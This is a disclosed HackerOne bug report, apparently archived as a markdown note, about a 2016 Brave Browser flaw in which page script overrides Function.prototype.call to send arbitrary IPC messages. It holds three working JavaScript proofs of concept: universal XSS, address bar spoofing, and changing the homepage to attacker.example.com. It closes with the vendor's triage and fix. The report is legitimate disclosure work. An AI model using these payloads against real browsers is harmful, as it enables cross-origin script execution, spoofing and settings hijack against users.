---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - vuln/xss
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-09-18
submitted: 2016-12-02T00:41:45.053Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "masatokinugawa"
source: "https://hackerone.com/reports/187542"
title: "Brave Browser unexpectedly allows to send arbitrary IPC messages"
---
# Brave Browser unexpectedly allows to send arbitrary IPC messages

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Brave Software | **Disclosed:** 2018-09-18

- Report: [https://hackerone.com/reports/187542](https://hackerone.com/reports/187542)
- CWE: Command Injection - Generic
- Submitted: 2016-12-02T00:41:45.053Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
I found that Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. 

## Steps to Reproduce:

1 .  An attacker overwrites `Function.prototype.call`, like this:

```
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="[ARBITRARY_IPC_MESSAGE_HERE]";
        e[1]="[ARBITRARY_IPC_MESSAGE_HERE]";
    }
    return this.apply(e);
}
```
2 .  An attacker calls `alert()`.

3 .  Brave's `alert()` function calls `Function.prototype.call` in the internal code. At this time, the overwritten `Function.prototype.call` is used in the `alert` internal code.

4 .  `Function.prototype.call` receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.

## PoC:

I'd like to show three PoCs:

###UXSS PoC

(If it goes well, you can see an alert dialog on google's domain.)
```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
    }
    return this.apply(e);
}
alert();

setTimeout(function(){
	for(var windowKey=0;windowKey<10000;windowKey++){
		Function.prototype.call=function(e){
			if(e && e[0] && e[0]=="window-alert"){
				e[0]="dispatch-action";
				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
			}
			return this.apply(e);
		}
		alert();
	}
},3000);
</script>
```


###Address Bar Spoofing PoC

(If it goes well, you can see https://www.google.com/ in address bar.)
```
<script>
Function.prototype.call=function(e){
	if(e && e[0] && e[0]=="window-alert"){
		e[0]="dispatch-action";
		e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}';
	}
	return this.apply(e);
}
alert();
</script>
```


###Change browser settings PoC

(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in `about:preferences`. )
```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'
    }
    return this.apply(e);
}
alert();
</script>
```

FYI, Electron has similar issues. I reported it to Electron team and they are working on it.
Could you confirm this bug?
Thanks!

## Timeline

- **Report Filed**
- **2016-12-02** @diracdeltas: looking into it now
- **2016-12-02** @diracdeltas: @masatokinugawa it seems that this attack only works if the attacker code is running in the main renderer process, not the webview renderer process. The main renderer process is 'trusted' code (part of Brave browser itself), whereas webpages are loaded in webview processes.

do you have a PoC webpage that can do this attack when it is loaded in a Brave webview?

if not, then this is not a vulnerability by itself.
- **2016-12-02** @masatokinugawa: When you access the following page using Brave browser, your browser settings is changed. 
https://vulnerabledoma.in/brave/settings_change.html

This means that the attack is successful from Brave webview, right?
- **2016-12-02** @diracdeltas: @masatokinugawa thanks, looks like i was mistaken because i was trying out the PoC in an iframe
- **Report Triaged**
- **2016-12-02** @masatokinugawa: Also, you can test address bar spoofing PoC: https://vulnerabledoma.in/brave/spoofing.html
- **2016-12-02** @diracdeltas: @masatokinugawa link to Electron issue? or is it not public?
- **2016-12-02** @masatokinugawa: sorry, it's not public yet
- **2016-12-02** @diracdeltas: tentatively fixed by https://github.com/brave/electron/commit/03f05980afc480f29d3ea4bb3e7e0ebe0b62e428
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2018-09-18** @masatokinugawa: Hi, could you open this bug, #188561 and #188086?
Thanks!
- **Agreed On Going Public**
- **Report Became Public**
